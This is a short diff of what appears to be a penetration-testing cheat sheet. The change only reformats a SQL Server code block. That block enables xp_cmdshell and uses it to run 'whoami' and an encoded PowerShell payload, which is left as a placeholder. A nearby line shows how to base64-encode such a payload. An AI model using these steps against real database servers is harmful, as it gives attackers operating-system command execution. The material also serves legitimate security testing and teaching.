@@ -85,13 +85,13 @@ cat file_name |iconv -t utf-16le | base64 -w0;echo
 ## [+]  Enable the xp_cmdshell
 
 ```bash
-+  EXEC sp_configure 'show advanced options', 1;         
-+  RECONFIGURE;                                          
-+  sp_configure;                                         
-+  EXEC sp_configure 'xp_cmdshell', 1;                   
-+  RECONFIGURE;                                          
-+  exec xp_cmdshell 'whoami'                             
-+  exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
+EXEC sp_configure 'show advanced options', 1;         
+RECONFIGURE;                                          
+sp_configure;                                         
+EXEC sp_configure 'xp_cmdshell', 1;                   
+RECONFIGURE;                                          
+exec xp_cmdshell 'whoami'                             
+exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
 ```
 
 
